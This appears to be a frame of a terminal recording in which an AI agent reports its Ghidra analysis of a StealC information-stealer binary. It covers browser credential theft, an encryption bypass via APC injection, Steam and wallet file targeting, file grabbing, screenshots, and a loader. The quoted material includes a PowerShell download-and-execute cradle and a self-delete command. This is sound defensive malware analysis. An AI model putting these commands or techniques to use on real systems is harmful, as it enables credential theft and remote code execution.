[0.043, "o", "\u001b[5;7H\u001b[97m\u001b[1m3\u001b[3CBrowser theft (!129):\u001b(B\u001b[m\u001b[93m stealer_main_payload\u001b[97m @ 0x140029f68\u001b[Cdispatches s\u001b[Crver-supplied browser descriptors: types 1/2 →\u001b[39m                   \r\n\u001b[93mchromium_collect_creds_and\u001b[Cabe_key\u001b[97m @ 0x14001f100 (type 1 adds the v2\u001b[C ABE bypass via the Early-Bird APC injector @ 0x14003a048 + embedded IElevator\r\nhelper DLL),\u001b[Ctype 3 → Gecko handler @ 0x1400225ac (\u001b[93mprofiles.ini\u001b[97m, NSS\u001b[93m PK11SDR_Decrypt\u001b[97m @ 0x14001fa90). Chromium DB files (Cookies/Login Da\u001b[Ca/Web\u001b[39m      \r\n\u001b[97mDat\u001b[C/History\u001b[Cslots xref-pinned to FUN_14001b6ac) are stolen\u001b[1m wholesale — no SQL SELECTs exist in the binary\u001b(B\u001b[m\u001b[97m. Output\u001b[93m passwords.txt\u001b[97m with\r\n\u001b[93murl:/login:/password:\u001b[97m labels.\r\n\u001b[39m                                                                                                                                        \r\n\u001b[97m\u001b[1mTask 14 — Wallets/apps (!130):\u001b(B\u001b[m\u001b[97m zero hardcode\u001b[C wallet/extension/app names — targeting is server-side (\u001b[93mwallets\u001b[97m/\u001b[93mbrowsers\u001b[97m/\u001b[93mplugins\u001b[97m/\u001b[93mfiles\u001b[97m config keys);\u001b[39m    \r\n\u001b[97mhardcoded plumbing:\u001b[93m chrome_ext\u001b[Cnsion_\u001b[97m + IndexedDB collect\u001b[Con\u001b[C(FUN_14\u001b[C01\u001b[C7a0).\u001b[1m Steam is the one built-in module\u001b(B\u001b[m\u001b[97m (\u001b[93msteam_steal_ssfn_vdf_module\u001b[97m @\u001b[39m \r\n\u001b[97m0x140037704: HKCU\u001b[93m Software\\Valve\\Steam\u001b[97m →\u001b[93m SteamPath\u001b[97m →\u001b[93m \\config\\\u001b[97m +\u001b[93m ssfn*,*.vdf\u001b[97m mask list).\u001b[93m steal_outlook\u001b[97m flag exists but its consumer wasn't pinpointed\r\n(flagged for review). Telegram/Discord/FTP/VPN: no hardcoded targeting demonstrated (reachable only via server grabber ru\u001b(B\u001b[m\u001b[97mles).\r\n\u001b[39m                                                                                                                                                \r\n\u001b[97m\u001b[1mTask 15 — Grabber/profiling (!131):\u001b(B\u001b[m\u001b[97m server-configured grabber (pars\u001b[2C FUN_140025910: masks/start_path/recursive/max_size/csidl; executor\u001b[39m         \r\n\u001b[93mgrabber_enum_match_collect_files\u001b[97m @ 0x1400082d8, copy-stage-read-delete pattern). Screenshot @ 0x14003a430: GDI+\u001b[1m virtual-screen (multi-monitor)\u001b(B\u001b[m\u001b[97m BitBlt\r\nSRCCOPY|CAPTUREBLT → JPEG (\u001b[93mscreens\u001b[Cot.jpg\u001b[97m). System profiling @ 0x140026dc4: process list, \u001b[Cnstalled apps via\u001b[CUninstall key ×2 (@ 0x14\u001b[C0385c0),\u001b[39m    \r\n\u001b[97mHWID-from-volume-serial beacon (FUN_140026214).\u001b[39m                                                                                                      \r\n                           \r\n\u001b[97m\u001b[1mTask 16 — Loader + self-delete (!132):\u001b(B\u001b[m\u001b[97m C2\u001b[93m loader\u001b[97m tasking @ 0x140029900 dispatches\u001b[1m EXE\u001b(B\u001b[m\u001b[97m (0x140028978),\u001b[1m PowerShell IEX cradle\u001b(B\u001b[m\u001b[97m (0x140028e58,\u001b[93m -nop -c\r\niex(New-Object Net.WebClient).DownloadString('…')\"\u001b[97m via SysWOW64 pow\u001b[Crshell.exe), and\u001b[1m MSI\u001b(B\u001b[m\u001b[97m (0x140029224,\u001b[93m msiexec /i … /passive\u001b[97m), each with optional\r\n\u001b[93mrunas\u001b[97m elevation via ShellExecuteExA (identity byte-proven, slot 0x1400b08d0).\u001b[1m Self-delete @ 0x14003b870 confirmed\u001b(B\u001b[m\u001b[97m:\u001b[93m GetModuleFileNameA\u001b[97m →\u001b[93m cmd.exe /c\r\ntimeout /t 5 & del /f /q \"<own path>\"\u001b[97m via ShellExecuteExA (verb \"open\" byte-verified) → ExitProcess(0) (name byte-proven twice: blob 0x14007d770 →\r\nslot 0x1400b1d90 → ptr 0x1400b4e08) — gated on the server config flag\u001b[93m self_delete\u001b[97m. Bonus artifact: builder source path\u001b[93m C:\\builder_v2\\stealc\\json.h\u001b[97m in\r\nthe loader-tasking asserts.\r\n\u001b[39m                         \r\n\u001b[97mEleven key functions were renamed in the Ghidra project for persistence.\r\n\u001b[39m                         \r\n\u001b[32m●\u001b[39m \u001b[90mDeveloper(Themisto) · ▸ run_script(grep_decomp_for_ranges) · 270 chars\u001b[32;100H\u001b[36m\u001b[1m⠧\u001b[34;2H\u001b(B\u001b[m"]
